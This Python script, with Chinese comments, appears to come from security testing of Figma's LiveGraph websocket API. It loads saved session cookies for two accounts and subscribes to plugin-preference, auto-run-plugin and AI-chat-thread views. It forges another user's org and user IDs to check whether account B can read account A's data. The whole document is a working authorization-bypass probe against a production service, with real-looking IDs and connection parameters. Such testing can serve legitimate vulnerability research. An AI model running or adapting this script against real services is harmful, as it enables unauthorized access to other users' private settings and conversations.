"""PluginPreferencesView/AutoRunPluginsView 带 uid 重验(targetOrgId/targetUserId 伪造)
B 登录 → A 的 org+user(越权方向);A 登录 → A 自己(基线)
"""
import sys, json, asyncio, io
import websockets
sys.stdout.reconfigure(encoding="utf-8", errors="replace")

CK_A = io.open('ws_cookie_A_new.txt', encoding='utf-8').read().strip()
CK_B = io.open('ws_cookie_B_new.txt', encoding='utf-8').read().strip()
A_UID = "1666382703778278399"
B_UID = "1667396392129259941"
A_ORG = "1666382706663462213"   # A team(org 未知,用 team)
B_ORG = "1667396394890946753"
PUB = "bv2nMIdFf4u3dESGail4sm"
CAT = json.load(io.open('lg_views_catalog.json', encoding='utf-8'))
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Safari/537.36"

def lg_url(uid):
    return (f"wss://www.figma.com/api/livegraph?pv=1&pr=251c5be83e6853e5&pt=1786072093"
            f"&ph=sb9dUg8LQV0WGY29b-j8nggmhGX8TR2vghWs-rNzbds&userId={uid}&anonUserId="
            f"&clientType=web&commitHash=5848603c50c1ee154ea6a1fe5ee3aab3791c5b48"
            f"&preload=%7B%7D&requestedProtocolVersion=2"
            f"&clientUrl=https%3A%2F%2Fwww.figma.com%2Ffile%2F{PUB}"
            f"&connectionType=initial&reconnect=0")

def auth(uid):
    return {"messageType": "auth", "clientType": "web",
            "args": {"userId": uid, "anonymousUserId": None},
            "tags": {"clientType": "web", "commitHash": "81855c2bc7c604648169c4e4333f43579bfa7464",
                     "clientUrl": f"https://www.figma.com/file/{PUB}"},
            "clientRequestedVersion": 2}

async def sub_view(label, view_name, args, cookie, uid, wait=12):
    frames = []
    try:
        async with websockets.connect(lg_url(uid),
                                      additional_headers={"User-Agent": UA, "Cookie": cookie,
                                                          "Origin": "https://www.figma.com"},
                                      max_size=50_000_000, open_timeout=15) as ws:
            await ws.send(json.dumps(auth(uid)))
            for _ in range(3):
                msg = await asyncio.wait_for(ws.recv(), timeout=8)
                if isinstance(msg, str) and "authSuccess" in msg:
                    au = json.loads(msg).get("userId")
                    print(f"    [auth] userId={au}")
                    break
            vh = CAT.get(view_name, {}).get("hash", "ab" * 16)
            await ws.send(json.dumps({"messageType": "subscribe", "viewName": view_name,
                                      "viewHash": vh, "loadType": "initial", "args": args}))
            deadline = asyncio.get_event_loop().time() + wait
            while asyncio.get_event_loop().time() < deadline:
                try:
                    msg = await asyncio.wait_for(ws.recv(), timeout=3)
                    if isinstance(msg, str):
                        frames.append(msg)
                except asyncio.TimeoutError:
                    break
    except Exception as e:
        print(f"[{label}] ❌ {type(e).__name__}: {str(e)[:90]}"); return
    total = sum(len(f) for f in frames)
    has_data = any('"initial": {' in f for f in frames)
    errs = [f for f in frames if '"errors"' in f]
    print(f"[{label}] 帧数={len(frames)} 总{total}B 含initial={has_data} 错误帧={len(errs)}")
    for f in frames:
        if '"initial": {' in f:
            print(f"    📄 {f[:700]}")
            break
    if not has_data and errs:
        for f in errs[:1]:
            print(f"    🚫 {f[:400]}")

async def main():
    print("======== PluginPreferencesView (targetOrgId+targetUserId) ========")
    await sub_view("A→A 自己 ⭐基线", "PluginPreferencesView",
                   {"targetOrgId": A_ORG, "targetUserId": A_UID}, CK_A, A_UID)
    await sub_view("B→A 越权 ⭐", "PluginPreferencesView",
                   {"targetOrgId": A_ORG, "targetUserId": A_UID}, CK_B, B_UID)
    await sub_view("B→B 自己", "PluginPreferencesView",
                   {"targetOrgId": B_ORG, "targetUserId": B_UID}, CK_B, B_UID)
    await sub_view("A→B 越权", "PluginPreferencesView",
                   {"targetOrgId": B_ORG, "targetUserId": B_UID}, CK_A, A_UID)

    print("\n======== AutoRunPluginsView (targetOrgId+targetUserId) ========")
    await sub_view("A→A 自己 ⭐基线", "AutoRunPluginsView",
                   {"targetOrgId": A_ORG, "targetUserId": A_UID}, CK_A, A_UID)
    await sub_view("B→A 越权 ⭐", "AutoRunPluginsView",
                   {"targetOrgId": A_ORG, "targetUserId": A_UID}, CK_B, B_UID)
    await sub_view("B→B 自己", "AutoRunPluginsView",
                   {"targetOrgId": B_ORG, "targetUserId": B_UID}, CK_B, B_UID)

    print("\n======== FileAiChatThreadsView 带 uid 确认 ========")
    await sub_view("A→A ownerId=A", "FileAiChatThreadsView", {"ownerId": A_UID}, CK_A, A_UID)
    await sub_view("B→A ownerId=A", "FileAiChatThreadsView", {"ownerId": A_UID}, CK_B, B_UID)

asyncio.run(main())
